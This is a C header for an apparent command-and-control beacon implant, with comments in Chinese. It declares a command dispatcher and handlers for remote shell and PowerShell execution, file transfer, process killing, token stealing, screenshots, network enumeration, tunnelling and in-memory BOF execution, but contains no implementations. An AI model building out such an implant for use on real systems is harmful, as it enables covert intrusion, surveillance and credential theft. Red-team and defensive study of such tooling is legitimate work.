#pragma once

#include "beacon_context.h"
#include "beacon_packet.h"
#include "beacon_bof.h"

/* 通用控制 */
#define BEACON_COMMAND_SLEEP          1u
#define BEACON_COMMAND_EXIT           2u

/* 命令执行 */
#define BEACON_COMMAND_SHELL          10u
#define BEACON_COMMAND_POWERSHELL     11u

/* 文件系统 */
#define BEACON_COMMAND_CD             20u
#define BEACON_COMMAND_LS             21u
#define BEACON_COMMAND_PWD            22u
#define BEACON_COMMAND_CAT            23u
#define BEACON_COMMAND_MKDIR          24u
#define BEACON_COMMAND_RM             25u
#define BEACON_COMMAND_MV             26u
#define BEACON_COMMAND_CP             27u
#define BEACON_COMMAND_DOWNLOAD       28u
#define BEACON_COMMAND_UPLOAD         29u
#define BEACON_COMMAND_FILEBROWSER    30u
#define BEACON_COMMAND_SETATTR        31u
#define BEACON_COMMAND_ZIP            32u

/* 进程、令牌和基础信息 */
#define BEACON_COMMAND_PS             40u
#define BEACON_COMMAND_KILLJOB        41u
#define BEACON_COMMAND_KILL           42u
#define BEACON_COMMAND_STEALTOKEN     43u
#define BEACON_COMMAND_JOBS           44u
#define BEACON_COMMAND_WHOAMI         50u
#define BEACON_COMMAND_SCREENSHOT     51u
#define BEACON_COMMAND_NETINFO        52u
#define BEACON_COMMAND_NETSTAT        53u

/* 隧道与 BOF */
#define BEACON_COMMAND_TUNNEL_START   60u
#define BEACON_COMMAND_TUNNEL_CONTROL 61u
#define BEACON_COMMAND_TUNNEL_DATA    62u
#define BEACON_COMMAND_TUNNEL_CLOSE   63u
#define BEACON_COMMAND_BOF            70u

PacketList CommandDispatch(BeaconContext* ctx, UINT32 task_id, UINT32 command_id, const ByteBuf* payload);

ByteBuf CommandShell(BeaconContext* ctx, UINT32 task_id, UINT32 command_id, Parser* parser, INT powershell);
ByteBuf CommandCd(Parser* parser);
ByteBuf CommandLs(Parser* parser);
ByteBuf CommandPwd(VOID);
ByteBuf CommandCat(Parser* parser);
ByteBuf CommandMkdir(Parser* parser);
ByteBuf CommandRm(Parser* parser);
ByteBuf CommandMv(Parser* parser);
ByteBuf CommandCp(Parser* parser);
ByteBuf CommandFilebrowser(Parser* parser);
ByteBuf CommandSetattr(Parser* parser);
ByteBuf CommandZip(Parser* parser);
ByteBuf CommandPs(VOID);
ByteBuf CommandKill(Parser* parser);
ByteBuf CommandStealToken(Parser* parser);
ByteBuf CommandWhoami(const BeaconContext* ctx);
ByteBuf CommandScreenshot(Parser* parser);
ByteBuf CommandNetinfo(VOID);
ByteBuf CommandNetstat(VOID);
ByteBuf CommandJobs(BeaconContext* ctx);
ByteBuf CommandKillJob(BeaconContext* ctx, Parser* parser);
